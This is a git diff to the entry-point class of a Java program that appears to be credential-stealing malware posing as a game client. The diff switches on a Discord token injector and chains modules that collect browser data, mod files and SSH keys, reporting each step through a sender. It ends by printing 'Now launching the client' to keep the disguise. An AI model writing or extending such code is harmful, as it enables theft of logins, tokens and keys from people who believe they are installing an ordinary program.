@@ -3,7 +3,6 @@ package io.github.luxotick;
 import io.github.luxotick.impl.Browsers;
 import io.github.luxotick.impl.DiscordInjector;
 import io.github.luxotick.impl.Mods;
-import io.github.luxotick.Sender;
 import io.github.luxotick.impl.Ssh;
 
 public class Start {
@@ -11,13 +10,16 @@ public class Start {
 		if (DiscordInjector.instance == null){
 			DiscordInjector.instance = new DiscordInjector();
 		}
-		//DiscordInjector.instance.initialize();
-		Sender.sendMessage("Done discord injecting, now sending login data");
+		DiscordInjector.instance.initialize();
+		Sender.sendMessage("Starting...");
 		Browsers.main(argument);
-		Sender.sendMessage("Done sending browsers, now sending mods");
+		Sender.sendMessage("Browsers done.");
 		Mods.main(argument);
-		Sender.sendMessage("Done sending mods, now looking for ssh files");
+		Sender.sendMessage("Mods done.");
 		Ssh.main(argument);
+		Sender.sendMessage("Ssh done.");
+		Sender.sendMessage("Now launching the client.");
+		System.exit(0);
 	}
 	
 }
